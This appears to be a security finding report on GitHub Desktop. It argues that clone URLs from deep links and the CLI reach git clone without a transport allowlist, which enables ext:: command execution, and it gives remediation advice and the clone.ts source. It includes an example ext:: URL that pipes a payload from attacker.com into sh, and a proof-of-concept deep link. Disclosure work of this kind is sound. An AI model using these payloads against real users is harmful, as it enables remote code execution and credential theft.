### Title
Arbitrary command execution via `ext::`/`file::` transport in clone URLs from deep links and "Open in Desktop" flows - ([File: app/src/lib/git/clone.ts])

### Summary
GitHub Desktop's clone path builds a plain `git clone ... -- <url> <path>` argument vector and executes it via `dugite`'s `git()`/`spawn()` wrapper, without ever restricting which Git transport ("protocol") is used. `<url>` can originate from a `x-github-client://openrepo/<url>` deep link that an attacker gets a user to click, or from the CLI `github clone <url>` handler, or from the "Open in Desktop" web button. Git itself supports pseudo-transports such as `ext::` and `file::` that, when permitted, execute arbitrary local commands as part of "cloning." Desktop does not set `GIT_ALLOW_PROTOCOL`/`protocol.*.allow`, so nothing in the invoked `git` binary blocks these transports either.

### Finding Description
The deep-link handler `parseAppURL` extracts an attacker-controlled URL from a `x-github-client://openrepo/<url>` link and returns it verbatim as `IOpenRepositoryFromURLAction.url`, only validating `branch`/`pr` query parameters, not the URL/transport itself: [1](#0-0) 

`Dispatcher.dispatchURLAction` forwards this to `openRepositoryFromUrl`, which — for the common case (no `pr`, no `branch`) — calls `openOrCloneRepository(url)`: [2](#0-1) 

`openOrCloneRepository` pre-fills the Clone dialog with the attacker's raw URL as `initialURL`: [3](#0-2) 

When the user clicks "Clone," `resolveCloneInfo()` in the Clone dialog falls back to returning `{ url }` unchanged whenever the URL doesn't match a recognizable `owner/name` GitHub remote pattern (which `ext::…` or `file::…` never will), and the raw string is passed straight to `dispatcher.clone`: [4](#0-3) [5](#0-4) 

This eventually reaches `clone()` in `app/src/lib/git/clone.ts`, which only validates the *destination path* (`isClonePathSensitive`) — never the *URL's transport scheme* — before shelling out: [6](#0-5) 

The underlying `git()`/`spawnGit()` wrappers pass the argument array straight to `dugite`'s `exec`/`spawn`, adding authentication/proxy env vars but never a protocol allowlist such as `GIT_ALLOW_PROTOCOL`: [7](#0-6) [8](#0-7) 

Because native Git treats `ext::<command>` (and, depending on version/config, `file::`) as a valid, user-permitted transport by default, a URL like `ext::sh -c "curl attacker.com/payload | sh"` supplied as the clone target causes Git to execute the embedded shell command locally during "clone," entirely outside any repository sandbox — this is the classic `ext::` transport RCE class (related to CVE‑2017‑1000117-style transport abuse) affecting many Git GUI clients that don't restrict protocols.

The same unguarded `url` also reaches `clone()` via the CLI entry point (`github clone <url>` → `--cli-clone=<url>` → `dispatchCLIAction` → `openOrCloneRepository`/`openBranchNameFromUrl`) and via "cloneAgain" for missing repositories, so multiple attacker-influenced entry points funnel into the same unvalidated `clone()` call: [9](#0-8) [10](#0-9) 

### Impact Explanation
Successful exploitation causes arbitrary command execution under the logged-in user's privileges the moment the "Clone" click completes — a full, unattended-by-design step of the intended "Open in Desktop" feature (clicking a link, then clicking the pre-populated "Clone" button). This is not "prior malware," "leaked credentials," or "local access" — the attacker only needs the victim to click a link they control (e.g., from a webpage, chat message, or malicious repository README with an `x-github-client://` link), matching the "attacker controls a link or deep link the user clicks → code execution" impact class in scope.

### Likelihood Explanation
- The deep-link scheme (`x-github-client://openrepo/...`) is registered as a system protocol handler and is reachable from any web page or message without additional user gestures beyond the click.
- `parseAppURL` performs no scheme/transport validation on the `url` component at all — only `branch`/`pr` get sanitized.
- Existing safeguards (`isClonePathSensitive` in `clone.ts`, `testForInvalidChars` for branch names, `sanitizeCloneName`) address unrelated concerns (destination path traversal, ref name validation) and do nothing to prevent an `ext::`/`file::` URL from being accepted as the clone source.
- No `GIT_ALLOW_PROTOCOL` or `protocol.*.allow=never` is configured anywhere in `envForRemoteOperation`/`git()`, so the underlying Git binary's default policy (permissive for user-invoked commands) applies.

### Recommendation
Before calling `clone()` (and ideally centrally in `parseAppURL`/`parseRemote`/`resolveCloneInfo`), validate that the resolved clone URL's scheme is restricted to an explicit allowlist (`https`, `http`, `ssh`, `git`) and reject everything else (`ext::`, `file::`, `fd::`, etc.). Additionally, set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or the equivalent `-c protocol.ext.allow=never -c protocol.file.allow=never`) as part of the environment/args used in `git()`/`spawnGit()` for all remote operations (`clone`, `fetch`, `pull`, `push`, `ls-remote`), as defense in depth even if URL validation is bypassed somewhere.

### Proof of Concept
1. Register/verify the `x-github-client://` (or platform-equivalent, e.g. `github-mac://`) protocol handler is associated with GitHub Desktop (default install behavior).
2. Host or send a link:
   `x-github-client://openrepo/ext::sh%20-c%20%22touch%20/tmp/pwned%22`
3. Victim clicks the link. `parseAppURL` parses it into `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', branch: null, pr: null, filepath: null }` (no validation rejects this).
4. `openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone dialog on the "Generic" tab pre-filled with that URL.
5. Victim clicks "Clone" (the single expected action of this feature).
6. `clone()` executes `git -c init.defaultBranch=... clone --recursive -- "ext::sh -c \"touch /tmp/pwned\"" <path>`, and Git invokes the embedded shell command, creating `/tmp/pwned` (in a real attack, exfiltrating SSH keys, tokens, or dropping malware).

Note: full confirmation would require running the exact bundled/dugite Git version to verify its default `protocol.ext.allow`/`protocol.file.allow` policy, since some newer Git releases have tightened these defaults; this could not be verified purely from the repository's local code, only that Desktop supplies no explicit protocol restriction itself.

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
